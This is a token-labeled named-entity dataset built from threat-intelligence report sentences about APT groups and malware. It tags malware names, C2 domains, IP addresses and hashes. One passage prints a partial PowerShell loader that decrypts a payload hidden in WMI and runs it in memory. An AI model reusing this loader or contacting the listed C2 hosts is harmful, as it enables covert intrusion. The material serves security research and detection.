.	O

This	O
possibility	O
suggests	O
:	O
Intruder	O
remote	O
access	O
to	O
the	O
'	O
master	O
'	O
system	O
Intruder	O
local	O
access	O
to	O
the	O
'	O
master	O
'	O
system	O
An	O
exfiltration	O
mechanism	O
in	O
the	O
form	O
of	O
another	O
piece	O
of	O
code	O
Further	O
analysis	O
confirms	O
the	O
malware	O
's	O
use	O
of	O
an	O
encrypted	O
file	O
stored	O
on	O
the	O
system	O
whereon	O
the	O
malware	O
is	O
executing	O
without	O
an	O
apparent	O
means	O
of	O
automatic	O
generation	O
.	O

This	O
complicates	O
identifying	O
its	O
network	O
traffic	O
,	O
as	O
the	O
header	O
bytes	O
in	O
the	O
zlib	O
compressed	O
data	O
section	O
no	O
longer	O
start	O
with	O
'	O
78	O
9C	O
'	O
,	O
as	O
shown	O
in	O
Figure	O
5	O
.	O

When	O
encryption	O
is	O
complete	O
,	O
the	O
MBR	O
code	O
displays	O
the	O
next	O
message	O
with	O
payment	O
instructions	O
,	O
but	O
as	O
noted	O
before	O
this	O
information	O
is	O
useless	O
.	O

We	O
have	O
been	O
studying	O
the	O
Duqu	B-malware.infosteal
Trojan	O
for	O
two	O
months	O
now	O
,	O
exploring	O
how	O
it	O
emerged	O
,	O
where	O
it	O
was	O
distributed	O
and	O
how	O
it	O
operates	O
.	O

C	O
:	O
\Users\The	O
Invincible\Desktop\gx\gx-current-program\LSASS\obj\Release\LSASS.pdb	O

Contribution	O
:	O

All	O
rights	O
reserved	O
.	O

Malicious	O
documents	O
in	O
the	O
attack	O
.	O

Selected	O
APIs	O
are	O
identified	O
by	O
hashes	O
,	O
which	O
are	O
used	O
to	O
load	O
the	O
APIs	O
dynamically	O
at	O
runtime	O
.	O

The	O
top	O
countries	O
with	O
StrongPity	O
malware	O
from	O
the	O
winrar.it	B-url.normal
site	O
from	O
May	O
25th	O
through	O
the	O
first	O
few	O
days	O
of	O
June	O
are	O
Italy	O
,	O
Belgium	O
,	O
Algeria	O
,	O
Cote	O
D'Ivoire	O
,	O
Morroco	O
,	O
France	O
,	O
and	O
Tunisia	O
.	O

At	O
the	O
time	O
of	O
this	O
writing	O
malicious	O
code	O
is	O
still	O
live	O
on	O
the	O
website	O
,	O
so	O
please	O
visit	O
with	O
care	O
until	O
the	O
website	O
is	O
clean	O
.	O

The	O
IP	O
address	O
after	O
verifying	O
the	O
filename	O
then	O
returns	O
the	O
executable	O
content	O
which	O
malware	O
reads	O
directly	O
from	O
the	O
network	O
stream	O
and	O
writes	O
to	O
the	O
disk	O
in	O
the	O
%	O
Appdata	O
%	O
\SQLIte	O
directory	O
as	O
shown	O
below	O
.	O

filename	O
is	O
based	O
on	O
static	O
analysis	O
.	O

[	O
High	O
Confidence	O
]	O
-	O
The	O
DQM	O
theory	O
presented	O
by	O
FireEye	O
and	O
later	O
explored	O
by	O
Symantec	O
in	O
2014	O
about	O
likely	O
tool	O
and	O
exploit	O
sharing	O
between	O
a	O
specific	O
set	O
of	O
groups	O
continues	O
to	O
hold	O
true	O
,	O
we	O
can	O
only	O
speculate	O
as	O
to	O
the	O
nature	O
of	O
the	O
relationships	O
organisationally	O
between	O
these	O
groups	O
.	O

icon.swf	O
(	O
214709aa7c5e4e8b60759a175737bb2b	O
)	O
-	O
>	O
icon.jpg	O
(	O
42a837c4433ae6bd7490baec8aeb5091	O
)	O
-	O
>	O
%	O
temp%\RealTemp.exe	O
(	O
61cc019c3141281073181c4ef1f4e524	O
)	O
After	O
icon.jpg	O
is	O
downloaded	O
by	O
the	O
flash	O
exploit	O
,	O
it	O
is	O
decoded	O
with	O
a	O
multibyte	O
xor	O
key	O
0xb369195a02	O
.	O

We	O
're	O
not	O
sure	O
how	O
wound	O
up	O
in	O
the	O
chat	O
room	O
or	O
how	O
he	O
met	O
.	O

They	O
also	O
rely	O
entirely	O
on	O
IPs	O
(	O
rather	O
than	O
domains	O
)	O
for	O
their	O
command-and-control	O
infrastructure	O
,	O
a	O
tactic	O
likely	O
borne	O
of	O
the	O
use	O
of	O
hacked	O
servers	O
for	O
infrastructure	O
.	O

This	O
malware	O
appears	O
to	O
be	O
just	O
part	O
of	O
a	O
wider	O
attack	O
toolkit	O
,	O
and	O
would	O
have	O
been	O
used	O
to	O
cover	O
the	O
attackers	O
'	O
tracks	O
as	O
they	O
sent	O
forged	O
payment	O
instructions	O
to	O
make	O
the	O
transfers	O
.	O

The	O
Big	B-malware.infosteal
Bang	I-malware.infosteal
campaign	O
described	O
below	O
incorporates	O
improved	O
capabilities	O
and	O
offensive	O
infrastructure	O
,	O
and	O
seems	O
to	O
be	O
even	O
more	O
targeted	O
.	O

Visits	O
from	O
the	O
following	O
locations	O
occurred	O
on	O
or	O
after	O
the	O
10th	O
:	O
●	O
Germany	O
(	O
likely	O
to	O
be	O
research	O
)	O
●	O
Ukraine	O
(	O
likely	O
to	O
be	O
research	O
)	O
●	O
Amazon	O
Web	O
Services	O
,	O
multiple	O
locations	O
(	O
likely	O
to	O
be	O
research	O
)	O
●	O
Googlebot	O
,	O
multiple	O
locations	O
●	O
US	O
●	O
Russia	O
●	O
Brazil	O
●	O
China	O
Ireland	O
(	O
likely	O
to	O
be	O
research	O
)	O
●	O
Finland	O
●	O
Canada	O
●	O
Taiwan	O
●	O
France	O
(	O
likely	O
to	O
be	O
research	O
)	O
●	O
Czech	O
Republic	O

We	O
will	O
keep	O
an	O
eye	O
on	O
what	O
happens	O
in	O
this	O
space	O
.	O

It	O
also	O
abuses	O
three	O
legitimate	O
MS	O
Office	O
functions	O
:	O
A	O
legitimate	O
Microsoft	O
Office	O
function	O
used	O
in	O
an	O
Office	O
file	O
to	O
retrieve	O
data	O
from	O
another	O
Office	O
file	O
An	O
Office	O
function	O
used	O
for	O
automatic	O
and	O
user-free	O
updates	O
for	O
embedded	O
links	O
upon	O
opening	O
.	O

Finally	O
,	O
perhaps	O
the	O
strongest	O
connection	O
comes	O
from	O
targeting	O
.	O

reg.exe	B-malware.unknown
,	O
reg1.exe	B-malware.unknown
:	O

998F30457BC48A1A6567203E0EC3282E	B-hash
powerhost.zapto.org	B-url.cncsvr

-	O
will	O
download	O
a	O
file	O
from	O
a	O
remote	O
URL	O
using	O
InternetOpen	O
and	O
InternetReadFile	O
#	O
sleep	O
?	O

The	O
introduction	O
of	O
the	O
backdoors	O
is	O
a	O
key	O
turning	O
point	O
in	O
the	O
investigation	O
since	O
it	O
demonstrated	O
the	O
threat	O
actor	O
's	O
resourcefulness	O
and	O
skill-set	O
.	O

A	O
200.63.46.23	B-ip.unknown
16	O
trxforcekitoriginal.com	B-url.unknown
.	O

13	O
.	O

This	O
is	O
indicative	O
of	O
the	O
adaptive	O
,	O
counter-intelligence	O
techniques	O
being	O
adopted	O
as	O
threat	O
actors	O
become	O
aware	O
that	O
many	O
security	O
researchers	O
use	O
these	O
services	O
to	O
gather	O
threat	O
intelligence	O
.	O

In	O
another	O
chat	O
room	O
called	O
'	O
Maira	O
's	O
room	O
'	O
,	O
a	O
target	O
of	O
interest	O
disclosed	O
he	O
was	O
a	O
government	O
officer	O
traveling	O
back	O
from	O
a	O
northern	O
city	O
near	O
the	O
country	O
's	O
provincial	O
capital	O
.	O

When	O
the	O
Korean-language	O
docx	O
icon	O
is	O
clicked	O
,	O
it	O
launches	O
the	O
embedded	O
HTA	O
 le	O
Error733.hta	O
.	O

A	O
list	O
of	O
main	O
capabilities	O
,	O
along	O
with	O
a	O
short	O
description	O
,	O
are	O
shown	O
below	O
in	O
Table	O
1	O
.	O

Key	O
,	O
$	O
prov.IV	O
)	O
$	O
ret	O
=	O
perfCr	O
$	O
decr	O
$	O
encData	O
Catch	O
{	O
}	O
function	O
sWP	O
(	O
$	O
cN	O
,	O
$	O
pN	O
,	O
$	O
aK	O
,	O
$	O
aI	O
)	O
if	O
(	O
$	O
cN	O
-eq	O
$	O
null	O
-or	O
$	O
pN	O
-eq	O
$	O
null	O
)	O
{	O
return	O
$	O
false	O
}	O
$	O
wp	O
=	O
(	O
[	O
wmiclass	O
]	O
$	O
cN	O
)	O
.Properties	O
[	O
$	O
pN	O
]	O
.Value	O
$	O
exEn	O
=	O
[	O
Convert	O
]	O
:	O
:FromBase64String	O
(	O
$	O
wp	O
)	O
$	O
exDec	O
=	O
decrAes	O
$	O
exEn	O
$	O
aK	O
$	O
aI	O
$	O
ex	O
=	O
[	O
Text.Encoding	O
]	O
:	O
:UTF8.GetString	O
(	O
$	O
exDec	O
)	O
if	O
(	O
$	O
ex	O
-eq	O
$	O
null	O
-or	O
$	O
ex	O
-eq	O
'	O
)	O
{	O
return	O
}	O
Invoke-Expression	O
$	O
ex	O
return	O
$	O
true	O
catch	O
{	O
return	O
$	O
false	O
$	O
aeK	O
=	O
[	O
byte	O
[	O
]	O
]	O
(	O
0xe7	O
,	O
0xd6	O
,	O
0xbe	O
,	O
0xa9	O
,	O
0xb7	O
,	O
0xe6	O
,	O
0x55	O
,	O
0x3a	O
,	O
0xee	O
,	O
0x16	O
,	O
0x79	O
,	O
0xca	O
,	O
0x56	O
,	O
0x0f	O
,	O
0xbc	O
,	O
0x3f	O
,	O
0x22	O
,	O
0xed	O
,	O
0xff	O
,	O
0x02	O
,	O
0x43	O
,	O
0x4c	O
,	O
0x1b	O
,	O
0xc0	O
,	O
0xe7	O
,	O
0x57	O
,	O
0xb2	O
,	O
0xcb	O
,	O
0xd8	O
,	O
0xce	O
,	O
0xda	O
,	O
0x00	O
)	O
$	O
aeI	O
=	O
[	O
byte	O
[	O
]	O
]	O
(	O
0xbe	O
,	O
0x7a	O
,	O
0x90	O
,	O
0xd9	O
,	O
0xd5	O
,	O
0xf7	O
,	O
0xaa	O
,	O
0x6d	O
,	O
0xe9	O
,	O
0x16	O
,	O
0x64	O
,	O
0x1d	O
,	O
0x97	O
,	O
0x16	O
,	O
0xc0	O
,	O
0x67	O
)	O
sWP	O
'	O
Wmi	O
'	O
'	O
Wmi	O
'	O
$	O
aeK	O
$	O
aeI	O
|	O
Out-Null	O
This	O
one-line	O
powershell	O
command	O
,	O
stored	O
only	O
in	O
WMI	O
database	O
,	O
establishes	O
an	O
encrypted	O
connection	O
to	O
C2	O
and	O
downloads	O
additional	O
powershell	O
modules	O
from	O
it	O
,	O
executing	O
them	O
in	O
memory	O
.	O

The	O
backdoor	O
interestingly	O
contains	O
the	O
well	O
known	O
Poison	O
Ivy	O
RAT	O
shellcode	O
as	O
well	O
as	O
its	O
own	O
custom	O
backdoor	O
.	O

This	O
campaign	O
made	O
use	O
of	O
a	O
malware	O
family	O
identified	O
as	O
NetTraveler	B-malware.infosteal
based	O
on	O
the	O
strings	O
found	O
in	O
the	O
malware	O
code	O
.	O

SRCHUI.dll	O
adrclients.dll	O
KB471623.exe	O

THE	O
ORIGINAL	O
,	O
BENIGN	O
APPLICATION	O
ENABLED	O
ARTILLERY	O
FORCES	O
TO	O
MORE	O
RAPIDLY	O
PROCESS	O
TARGETING	O
DATA	O
FOR	O
THE	O
D-30	O
HOWITZER	O
REDUCING	O
TARGETING	O
TIME	O
FROM	O
MINUTES	O
DOWN	O
TO	O
15	O
SECONDS	O
.	O

This	O
fake	O
root	O
CA	O
supposedly	O
signed	O
the	O
malware	O
's	O
binaries	O
,	O
which	O
will	O
make	O
them	O
look	O
legitimate	O
.	O

The	O
THREEBYTE	B-malware.backdoor
spear	O
phishing	O
incident	O
(	O
while	O
not	O
yet	O
attributed	O
)	O
shared	O
the	O
following	O
characteristics	O
with	O
the	O
above	O
HIGHTIDE	B-malware.backdoor
campaign	O
attributed	O
to	O
APT12	O
:	O
The	O
THREEBYTE	B-malware.backdoor
backdoor	O
was	O
compiled	O
two	O
days	O
after	O
the	O
HIGHTIDE	B-malware.backdoor
backdoors	O
.	O

When	O
examining	O
the	O
code	O
on	O
the	O
exploit	O
kit	O
website	O
a	O
list	O
of	O
255	O
IP	O
address	O
strings	O
was	O
found	O
.	O

The	O
DUBNIUM	B-malware.drop
binary	O
checks	O
for	O
the	O
running	O
environment	O
very	O
extensively	O
.	O

Plink	O
is	O
then	O
used	O
to	O
open	O
reverse	O
SSH	O
sessions	O
from	O
the	O
attacker	O
's	O
server	O
to	O
the	O
RDP	O
port	O
on	O
the	O
victim	O
computer	O
.	O

The	O
increased	O
threat	O
activity	O
against	O
the	O
U.S.	O
state	O
and	O
local	O
government	O
,	O
technology	O
,	O
advisory	O
services	O
,	O
and	O
health	O
sectors	O
in	O
the	O
past	O
two	O
weeks	O
is	O
of	O
great	O
concern	O
to	O
us	O
as	O
it	O
is	O
being	O
carried	O
through	O
phishing	O
emails	O
with	O
what	O
appears	O
to	O
be	O
a	O
tool	O
known	O
as	O
Unrecom	B-malware.infosteal
RAT	I-malware.infosteal
.	O

As	O
such	O
,	O
FireEye	O
believes	O
this	O
to	O
be	O
a	O
common	O
theme	O
for	O
this	O
APT	O
group	O
,	O
as	O
APT12	O
will	O
continue	O
to	O
evolve	O
in	O
an	O
effort	O
to	O
avoid	O
detection	O
and	O
continue	O
its	O
cyber	O
operations	O
.	O

NOVEMBER	O
2016	O
The	O
OSCE	O
confirmed	O
that	O
it	O
had	O
suffered	O
an	O
intrusion	O
,	O
which	O
a	O
Western	O
intelligence	O
service	O
attributed	O
to	O
APT28	B-malware.infosteal
.	O

and/or	O
its	O
affiliates	O
.	O

SYSTEM\CurrentControlSet\Control\Class\	O
{	O
4D36E967-E325-11CE-BFC1-08002BE10318	O
}	O

The	O
task	O
scheduler	O
method	O
has	O
also	O
been	O
added	O
to	O
the	O
newest	O
version	O
of	O
the	O
RAT	O
.	O

Apparently	O
,	O
the	O
system	O
that	O
we	O
were	O
studying	O
had	O
been	O
infected	O
in	O
late	O
August	O
2011	O
.	O

We	O
went	O
through	O
our	O
logs	O
to	O
search	O
for	O
entries	O
that	O
contained	O
hashes	O
related	O
to	O
the	O
ten	O
APT	B-malware.unknown
campaigns	O
we	O
have	O
been	O
investigating	O
.	O

Data	O
Source=	O
-	O
The	O
code	O
will	O
connect	O
using	O
the	O
SqlConnection	O
class	O
.	O

Meanwhile	O
,	O
the	O
Syrian	O
opposition	O
,	O
and	O
several	O
groups	O
working	O
closely	O
with	O
it	O
,	O
such	O
as	O
Cyber	O
Arabs	O
,	O
have	O
been	O
active	O
in	O
attempting	O
to	O
identify	O
potential	O
threats	O
and	O
warn	O
users	O
.	O

Perhaps	O
it	O
is	O
an	O
artefact	O
from	O
early	O
development	O
of	O
the	O
code	O
.	O

All	O
three	O
families	O
leave	O
the	O
impression	O
of	O
being	O
developed	O
by	O
a	O
team	O
of	O
skilled	O
software	O
developers	O
,	O
rather	O
than	O
being	O
the	O
product	O
of	O
a	O
malware	O
author	O
operating	O
in	O
the	O
criminal	O
underground	O
.	O

......................................................................................................................................	O
11	O
Infrastructure	O
......................................................................................................................................................	O
13	O
Key	O
C2	O
and	O
delivery	O
servers	O
.......................................................................................................................	O
13	O
Threat	O
actor	O
and	O
Attribution	O
..............................................................................................................................	O
15	O
Threat	O
actor	O
...............................................................................................................................................	O
15	O
Who	O
is	O
moayy2ad@hotmail.com	B-url.normal
..............................................................................................................	O
16	O
Contacting	O
ClearSky	O
........................................................................................................................................	O
22	O
By	O
Email	O
......................................................................................................................................................	O
22	O
By	O
phone	O
....................................................................................................................................................	O
23	O
Appendix	O
A	O
–	O
Indicators	O
......................................................................................................................................	O
24	O
This	O
report	O
is	O
a	O
follow-up	O
on	O
our	O
DustySky	B-malware.drop
operation	O
report	O
from	O
January	O
2016	O
.	O

@	O
@	O
sernum1	O

v6	O
=	O
objc_msgSend_ptr	O
(	O
classRef_MainHandler	O
,	O
selRef_alloc	O
)	O
;	O
v7	O
=	O
objc_msgSend_ptr	O
(	O
v6	O
,	O
(	O
const	O
char	O
*	O
)	O
selRef_init	O
)	O
;	O
v8	O
=	O
objc_retain_ptr	O
(	O
v5	O
,	O
selRef_init	O
)	O
;	O
v9	O
=	O
v7	O
;	O
v7	O
=	O
v8	O
;	O
objc_release_ptr	O
(	O
v9	O
)	O
;	O
objc_msgSend_ptr	O
(	O
v7	O
,	O
selRef_cycleLoop	O
)	O
;	O

Also	O
identified	O
during	O
this	O
analysis	O
,	O
was	O
the	O
prepositioning	O
of	O
a	O
domain	O
targeting	O
the	O
financial	O
institution	O
B-OF-AMERIC.COM	B-url.normal
,	O
created	O
in	O
April	O
2015	O
.	O

Python	O
function	O
made	O
for	O
testing	O
connection	O
to	O
Command	O
&	O
Control	O
servers	O
.	O

Ibid	O
.	O

The	O
campaigns	O
included	O
attacks	O
on	O
Punjabi	O
separatists	O
,	O
Norwegian	O
telecom	O
Telenor	O
,	O
and	O
multiple	O
other	O
companies	O
.	O

34	O
.	O

2018년	O
5월	O
현재까지	O
안다리엘	O
그룹이	O
한글파일	O
(	O
HWP	O
)	O
을	O
공격에	O
이용한	O
사례는	O
확인되지	O
않았다	O
.	O

Indeed	O
,	O
the	O
next	O
stages	O
of	O
the	O
attack	O
may	O
even	O
still	O
be	O
in	O
the	O
works	O
,	O
not	O
yet	O
deployed	O
or	O
only	O
deployed	O
to	O
selected	O
few	O
victims	O
.	O

Conclusion	O
:	O

This	O
is	O
the	O
official	O
history	O
of	O
Stuxnet	B-malware.backdoor
.	O

*	O
•	O
10.51	O
.	O

One	O
of	O
the	O
characteristics	O
of	O
the	O
group	O
behind	O
Poseidon	B-malware.infosteal
is	O
an	O
active	O
exploration	O
of	O
domain­based	O
networks	O
.	O

The	O
following	O
commands	O
and	O
their	O
descriptions	O
,	O
listed	O
by	O
executable	O
file	O
,	O
illustrate	O
the	O
submitted	O
malware	O
's	O
functionality	O
:	O

All	O
but	O
one	O
of	O
the	O
droppers	O
incorporated	O
anti-detection/analysis	O
techniques	O
to	O
identify	O
execution	O
in	O
VMware	O
or	O
the	O
Cuckoo	O
Sandbox	O
.	O

13	O
August	O
2016	O
.	O

Figure	O
2	O
:	O

Web	O
.	O

In	O
our	O
analysis	O
we	O
were	O
not	O
able	O
to	O
directly	O
connect	O
the	O
malicious	O
dll	B-malware.backdoor
file	O
to	O
the	O
X-Agent	B-malware.backdoor
samples	O
,	O
but	O
believe	O
they	O
are	O
both	O
part	O
of	O
a	O
well-coordinated	O
surgical	O
attack	O
powered	O
by	O
APT28	O
.	O

Change	O
the	O
current	O
work	O
directory	O
on	O
the	O
real	O
file	O
system	O
N/A	O
:	O
the	O
command	O
is	O
actually	O
not	O
implemented	O
Installation	O
or	O
de­installation	O
of	O
Dino	B-malware.backdoor
,	O
in	O
Windows	O
registry	O
and/or	O
as	O
a	O
service	O
Extracts	O
a	O
file	O
stored	O
in	O
ramFS	O
onto	O
the	O
machine	O
Deletes	O
a	O
file	O
stored	O
on	O
the	O
machine	O
Executes	O
a	O
file	O
stored	O
in	O
ramFS	O
Injects	O
a	O
file	O
stored	O
in	O
ramFS	O
into	O
a	O
running	O
process	O
Sleeps	O
for	O
a	O
given	O
amount	O
of	O
time	O
Terminates	O
a	O
running	O
process	O
N/A	O
:	O
the	O
command	O
is	O
actually	O
not	O
implemented	O
In	O
the	O
case	O
of	O
Dino	B-malware.backdoor
,	O
ramFS	O
serves	O
as	O
protected	O
storage	O
for	O
one	O
specific	O
file	O
containing	O
the	O
instructions	O
to	O
remove	O
the	O
malware	O
from	O
the	O
machine	O
.	O

The	O
attack	O
this	O
month	O
on	O
Taiwanese	O
Far	O
Eastern	O
International	O
Bank	O
has	O
some	O
of	O
the	O
hallmarks	O
of	O
the	O
Lazarus	O
group	O
:	O
•	O
Destination	O
beneficiary	O
accounts	O
in	O
Sri	O
Lanka	O
and	O
Cambodia	O
–	O
both	O
countries	O
have	O
been	O
used	O
previously	O
as	O
destinations	O
for	O
Lazarus	O
'	O
bank	O
heist	O
activity	O
;	O
•	O
Use	O
of	O
malware	O
previously	O
seen	O
in	O
Lazarus	O
'	O
Poland	O
and	O
Mexico	O
bank	O
attacks	O
.	O

The	O
techniques	O
documented	O
in	O
this	O
report	O
indicate	O
a	O
level	O
of	O
sophistication	O
that	O
make	O
reverse	O
engineering	O
more	O
difficult	O
and	O
to	O
obscure	O
the	O
intentions	O
of	O
the	O
actor	O
behind	O
this	O
malware	O
.	O

PCC_PROXY	O
:	O
:MainThread	O
function	O
consist	O
an	O
infinite	O
loop	O
that	O
only	O
terminates	O
when	O
the	O

Previously	O
,	O
we	O
were	O
only	O
able	O
to	O
cluster	O
activity	O
based	O
on	O
the	O
infrastructure	O
used	O
and	O
the	O
associated	O
malware	O
,	O
we	O
now	O
have	O
a	O
sufficient	O
number	O
of	O
samples	O
to	O
cluster	O
based	O
on	O
differences	O
in	O
implementation	O
between	O
the	O
code	O
used	O
for	O
ScanBox	B-malware.infosteal
in	O
each	O
case	O
.	O

The	O
domain	O
tiger.gamma-international.de	B-url.cncsvr
has	O
the	O
following	O
Whois	O
information	O
:	O
Domain	O
:	O
gamma-international.de	B-url.cncsvr
Name	O
:	O
Martin	O
Muench	O
Organisation	O
:	O
Gamma	O
International	O
GmbH	O
Address	O
:	O
Baierbrunner	O
Str	O
.	O

C:\Windows\Temp\bitsran.exe	B-malware.drop

Operation	B-malware.infosteal
Daybreak	I-malware.infosteal
appears	O
to	O
have	O
been	O
launched	O
by	O
unknown	O
attackers	O
to	O
infect	O
high	O
profile	O
targets	O
through	O
spear-phishing	O
e-mails	O
.	O

While	O
analyzing	O
the	O
download	O
URL	O
down.pzchao.com	B-url.cncsvr
,	O
we	O
realized	O
that	O
it	O
runs	O
on	O
a	O
HTTP	O
fi	O
le	O
server	O
and	O
we	O
managed	O
to	O
obtain	O
a	O
list	O
of	O
all	O
fi	O
les	O
hosted	O
on	O
it	O
,	O
including	O
meta-information	O
such	O
as	O
last	O
modifi	O
cation	O
timestamps	O
and	O
number	O
of	O
downloads	O
.	O

But	O
applying	O
the	O
decryption	O
routine	O
yields	O
the	O
following	O
:	O

The	O
primary	O
purpose	O
of	O
this	O
file	O
is	O
to	O
load	O
and	O
execute	O
a	O
main	O
module	O
,	O
which	O
is	O
created	O
separately	O
.	O

2016	O
.	O

As	O
a	O
result	O
,	O
nations	O
and	O
organizations	O
which	O
without	O
its	O
own	O
elite	O
hacker	O
groups	O
and	O
abundant	O
capital	O
can	O
also	O
launch	O
some	O
kind	O
of	O
APT	O
attack	O
via	O
the	O
attack	O
pattern	O
mentioned	O
in	O
this	O
case	O
.	O

All	O
modules	O
with	O
commands	O
:	O

The	O
command	O
and	O
control	O
(	O
C2	O
)	O
server	O
is	O
selected	O
based	O
on	O
the	O
string	O
in	O
the	O
file	O
'	O
id	O
'	O
:	O
al	O
-	O
>	O
'	O
185.43.209[.]182	B-ip.unknown
'	O
gr	O
-	O
>	O
'	O
212.237.46[.]6	B-ip.unknown
'	O
pz	O
-	O
>	O
'	O
87.98.146[.]34	B-ip.unknown
'	O
mn	O
-	O
>	O
'	O
80.211.140[.]235	B-ip.unknown
'	O
The	O
connection	O
to	O
one	O
of	O
the	O
hosts	O
is	O
then	O
started	O
over	O
raw	O
TCP	O
on	O
port	O
9999	O
.	O

Netsat.exe's	O
data	O
collection	O
functionality	O
suggested	O
data	O
destined	O
for	O
exfiltration	O
might	O
be	O
collected	O
by	O
the	O
'	O
master	O
'	O
system	O
.	O

Yet	O
Tajik	O
was	O
arrested	O
and	O
killed	O
because	O
the	O
Iranian	O
government	O
feared	O
that	O
Tajik	O
was	O
not	O
ideologically	O
aligned	O
and	O
posed	O
a	O
betrayal	O
and	O
flight	O
risk	O
.	O

CREDRIVER.dll	O

While	O
watering	B-malware.backdoor
holes	I-malware.backdoor
and	O
poisoned	O
installers	O
are	O
tactics	O
that	O
have	O
been	O
effectively	O
used	O
by	O
other	O
APT	O
,	O
we	O
have	O
never	O
seen	O
the	O
same	O
focus	O
on	O
cryptographic-enabled	O
software	O
.	O

c	O
:	O
\windows\system32\en-US\netsvc.dll.mui	O

Looking	O
at	O
passive	O
DNS	O
records	O
for	O
other	O
domains	O
pointing	O
to	O
the	O
IP	O
addresses	O
used	O
to	O
host	O
the	O
C	O
&	O
C	O
services	O
turned	O
up	O
many	O
other	O
related	O
domains	O
.	O

While	O
the	O
regex	O
syntax	O
may	O
seem	O
like	O
gibberish	O
,	O
mastering	O
it	O
is	O
not	O
as	O
difficult	O
as	O
it	O
seems	O
at	O
first	O
glance	O
.	O

Be	O
wary	O
of	O
opening	O
unsolicited	O
attachments	O
received	O
via	O
email	O
,	O
skype	O
or	O
any	O
other	O
communications	O
mechanism	O
.	O

The	O
spyware	O
's	O
infection	O
vector	O
involves	O
social	O
engineering	O
using	O
attractive	O
,	O
but	O
fictitious	O
Facebook	O
profiles	O
.	O

While	O
the	O
code	O
in	O
the	O
different	O
families	O
–	O
Carbanak	B-malware.infosteal
(	O
Win32/Spy.Sekur	O
)	O
,	O
Win32/Spy.Agent.ORM	B-malware.infosteal
,	O
and	O
Win32/Wemosis	B-malware.backdoor
–	O
is	O
different	O
it	O
does	O
contain	O
similar	O
traits	O
,	O
including	O
the	O
same	O
digital	O
certificate	O
.	O

While	O
initially	O
developed	O
for	O
mainland	O
Chinese	O
users	O
,	O
the	O
software	O
is	O
used	O
in	O
a	O
number	O
of	O
other	O
countries	O
.	O

This	O
often	O
leads	O
to	O
a	O
false	O
sense	O
of	O
security	O
within	O
the	O
community	O
and	O
perpetuates	O
the	O
idea	O
that	O
public	O
exposure	O
makes	O
us	O
all	O
safer	O
.	O

What	O
we	O
wanted	O
to	O
look	O
at	O
was	O
the	O
extent	O
of	O
the	O
wiping	O
on	O
the	O
partitions	O
and	O
whether	O
the	O
same	O
techniques	O
that	O
were	O
applied	O
to	O
a	O
single	O
partitioned	O
drive	O
would	O
still	O
apply	O
on	O
the	O
multiple	O
partitioned	O
drive	O
.	O

973ff7eb7a5b720c5f6aafe4cd0469d5	O
Summary	O
:	O
SPLM	B-malware.backdoor
is	O
being	O
carved	O
up	O
and	O
delivered	O
as	O
memory-only	O
chunks	O
of	O
compiled	O
code	O
.	O

Cisco	O
Cloud	O
Web	O
Security	O
(	O
CWS	O
)	O
or	O
Web	O
Security	O
Appliance	O
(	O
WSA	O
)	O
web	O
scanning	O
prevents	O
access	O
to	O
malicious	O
websites	O
and	O
detects	O
malware	O
used	O
in	O
these	O
attacks	O
.	O

As	O
mentioned	O
in	O
the	O
behavioral	O
analysis	O
section	O
,	O
the	O
Cmstar	B-malware.unknown
downloader	O
gathers	O
system-specific	O
information	O
to	O
send	O
to	O
the	O
C2	O
server	O
.	O

We	O
were	O
also	O
able	O
to	O
observe	O
links	O
between	O
Operation	B-malware.ransom
Manul	I-malware.ransom
and	O
a	O
malware	O
campaign	O
targeting	O
the	O
family	O
of	O
Mukhtar	O
Ablyazov	O
,	O
co-founder	O
of	O
the	O
Democratic	O
Choice	O
of	O
Kazakhstan	O
,	O
a	O
party	O
opposed	O
to	O
the	O
authoritarian	O
rule	O
of	O
Kazakhstan	O
's	O
President	O
Nursultan	O
Nazarbayev.Ablyazov	O
is	O
currently	O
fighting	O
extradition	O
from	O
France	O
,	O
where	O
he	O
lives	O
in	O
exile	O
,	O
to	O
Nazarbayev-allied	O
Russia	O
.	O

This	O
way	O
the	O
attackers	O
actually	O
know	O
what	O
applications	O
and	O
commands	O
they	O
can	O
use	O
without	O
raising	O
an	O
alert	O
to	O
the	O
network	O
administrator	O
during	O
lateral	O
movement	O
and	O
exfiltration	O
.	O

None	O
,	O
some	O
or	O
all	O
domains	O
in	O
this	O
list	O
might	O
be	O
malicious	O
as	O
well	O
.	O

0x406ECA	O
:	O
72D8	O
JB	O
0x406EA4	O

After	O
every	O
action	O
is	O
performed	O
the	O
malware	O
sends	O
a	O
response	O
to	O
the	O
control	O
server	O
indicating	O
whether	O
the	O
action	O
was	O
successful	O
.	O

This	O
is	O
achieved	O
by	O
applying	O
the	O
detours	O
technique	O
,	O
which	O
implements	O
trampoline	O
functions	O
to	O
be	O
invoked	O
every	O
time	O
a	O
hooked	O
API	O
is	O
called.To	O
achieve	O
this	O
,	O
Babar	B-malware.drop
rewrites	O
the	O
in-memory	O
code	O
for	O
target	O
APIs	O
.	O

If	O
one	O
of	O
these	O
products	O
is	O
installed	O
,	O
the	O
malware	O
will	O
only	O
run	O
once	O
without	O
persistence	O
.	O

IEC	O
60870-5-101	O
)	O
,	O
an	O
international	O
standard	O
that	O
describes	O
a	O
protocol	O
for	O
monitoring	O
and	O
controlling	O
electric	O
power	O
systems	O
The	O
protocol	O
is	O
used	O
for	O
communication	O
between	O
industrial	O
control	O
systems	O
and	O
Remote	O
Terminal	O
Units	O
(	O
RTUs	O
)	O
The	O
actual	O
communication	O
is	O
transmitted	O
through	O
a	O
serial	O
connection	O
The	O
101	O
payload	O
component	O
partly	O
implements	O
the	O
protocol	O
described	O
in	O
the	O
IEC	O
101	O
standard	O
and	O
is	O
able	O
to	O
communicate	O
with	O
an	O
RTU	O
or	O
any	O
other	O
device	O
with	O
support	O
for	O
that	O
protocol	O
Once	O
executed	O
,	O
the	O
101	O
payload	O
component	O
parses	O
the	O
configuration	O
stored	O
in	O
its	O
INI	O
file	O
The	O
configuration	O
may	O
contain	O
several	O
entries	O
:	O
process	O
name	O
,	O
The	O
name	O
of	O
the	O
process	O
specified	O
in	O
the	O
configuration	O
belongs	O
to	O
an	O
application	O
the	O
attackers	O
suspect	O
is	O
running	O
on	O
the	O
victim	O
machine	O
It	O
should	O
be	O
the	O
application	O
the	O
victim	O
machine	O
uses	O
to	O
communicate	O
through	O
serial	O
connection	O
with	O
the	O
RTU	O
The	O
101	O
payload	O
attempts	O
to	O
terminate	O
the	O
specified	O
process	O
and	O
starts	O
to	O
communicate	O
with	O
the	O
specified	O
device	O
,	O
using	O
the	O
,	O
and	O
Windows	O
API	O
functions	O
The	O
first	O
COM	O
port	O
from	O
the	O
configuration	O
